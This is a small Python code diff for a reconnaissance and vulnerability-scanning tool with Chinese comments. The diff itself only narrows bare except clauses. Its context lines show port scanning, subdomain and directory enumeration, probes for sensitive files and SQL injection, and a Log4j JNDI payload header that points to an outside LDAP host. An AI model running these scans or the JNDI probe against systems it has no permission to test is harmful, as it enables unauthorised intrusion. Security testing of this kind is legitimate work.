@@ -96,7 +96,7 @@ class FullReconEngine:
             ip = socket.gethostbyname(domain)
             self.results["assets"]["ip"] = ip
             print(f"  IP: {ip}")
-        except:
+        except Exception:
             pass
         
         # Whois (如果可用)
@@ -104,7 +104,7 @@ class FullReconEngine:
             result = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=10)
             if result.returncode == 0:
                 self.results["assets"]["whois"] = result.stdout[:500]
-        except:
+        except Exception:
             pass
     
     def _port_scan(self):
@@ -123,7 +123,7 @@ class FullReconEngine:
                 if result == 0:
                     open_ports.append(port)
                 sock.close()
-            except:
+            except Exception:
                 pass
         
         self.results["assets"]["open_ports"] = open_ports
@@ -145,7 +145,7 @@ class FullReconEngine:
                 subdomains = [s.strip() for s in result.stdout.split('\n') if s.strip()]
                 self.results["assets"]["subdomains"] = subdomains[:50]  # 限制50个
                 print(f"  子域名: {len(subdomains)}")
-        except:
+        except Exception:
             print("  subfinder不可用")
     
     def _web_fingerprint(self):
@@ -205,7 +205,7 @@ class FullReconEngine:
                 with urllib.request.urlopen(req, timeout=3, context=ssl_context) as response:
                     if response.status == 200:
                         found_dirs.append(dir_path)
-            except:
+            except Exception:
                 pass
         
         self.results["assets"]["directories"] = found_dirs
@@ -247,7 +247,7 @@ class FullReconEngine:
                     if re.search(r'password', js_content, re.IGNORECASE):
                         sensitive_info.append("可能包含密码")
                     
-                except:
+                except Exception:
                     pass
             
             self.results["assets"]["js_files"] = js_files
@@ -280,7 +280,7 @@ class FullReconEngine:
                             "severity": "medium",
                             "description": f"发现敏感文件: {path}"
                         })
-            except:
+            except Exception:
                 pass
         
         self.results["assets"]["sensitive_files"] = found_files
@@ -307,7 +307,7 @@ class FullReconEngine:
                                 "description": "可能存在SQL注入漏洞"
                             })
                             break
-            except:
+            except Exception:
                 pass
         
         # Log4j检测
@@ -316,7 +316,7 @@ class FullReconEngine:
             test_headers['X-Api-Version'] = '${jndi:ldap://test.com/a}'
             req = urllib.request.Request(self.target, headers=test_headers)
             urllib.request.urlopen(req, timeout=5, context=ssl_context)
-        except:
+        except Exception:
             pass
         
         print(f"  漏洞: {len(self.results['vulnerabilities'])}")
